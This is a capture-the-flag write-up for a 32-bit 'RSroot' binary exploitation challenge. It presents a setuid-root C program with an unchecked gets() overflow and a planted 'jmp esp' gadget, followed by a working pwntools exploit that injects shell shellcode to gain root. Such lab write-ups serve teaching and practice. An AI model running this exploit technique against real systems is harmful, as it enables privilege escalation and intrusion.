# RSroot
### Category: Pwn
### Level: Medium

---

### Challenge

A shell is given with buffer overflow flaw with its elf executable file

```bash
#include <stdio.h>

int secret_function(){
        asm("jmp %esp");
}
void feedback(){
        char buf[64];
        puts("!!@#$%^&*()_+   @@@@@@@     @@@@@@@   @#$%^&*!@\n!!        !!   @@$%*/$@@   @@$%*/$@@     $%    \n!!        !!  @@%     %@@ @@%     %@@    #$    \n!!@#$%^&*()_+ @@%     %@@ @@%     %@@    !@    \n!!      !!     @@$%*/$@@   @@$%*/$@@     #$    \n!!        !!    @@@@@@@     @@@@@@@      &*    \n     #        %%%%     %%%%  @#$%&*()+  @%%%%%%%@ @%%%%%%%@\n    @$@      %    %   %    % @         @          @        \n   &   @    %        %       @         @          @        \n  *@@$@@*   %        %       @#$%&*()+ @@@@@@@@@  @@@@@@@@@\n &       &  %        %       @                 @          @\n@         @  %    %   %    % @                 @          @\n@          @   %%%%     %%%% @#$%&*()+ @%%%%%%%@   @%%%%%%@\n");
        puts("Wanna say anything ?\n");
        gets(buf);
}

int main(){
        setuid(0);
        setgid(0);
        feedback();
        return 0;
}

```
<i>gets</i> function can be overflowed

Users need to overflow the code and inject payload to get reverse shell

### Solution

To solve this I used shellcraft from pwntools library python to generate 32bit linux shell payload

```bash
from pwn import *


gdbscript = '''
init-pwndebug
continue
'''.format(**locals())

exe = './server'
elf = context.binary = ELF(exe,checksec=False)
context.log_level = 'debug'


io = process('./server')
padding = 76

jmp_esp = asm("jmp esp")
jmp_esp = next(elf.search(jmp_esp))

#shellcode = asm(shellcraft.cat('flag.txt'))
shellcode=asm(shellcraft.sh())


shellcode += asm(shellcraft.exit())

payload = flat(
        'a' * padding,
        jmp_esp,
        'a' * 16,
        shellcode
        )

write("payload",payload)

io.sendlineafter(b':',payload)
io.interactive()                                                        
``` 

Which will take the root access in that server, 
Then just open the <i>flag.txt</i> file to get the flag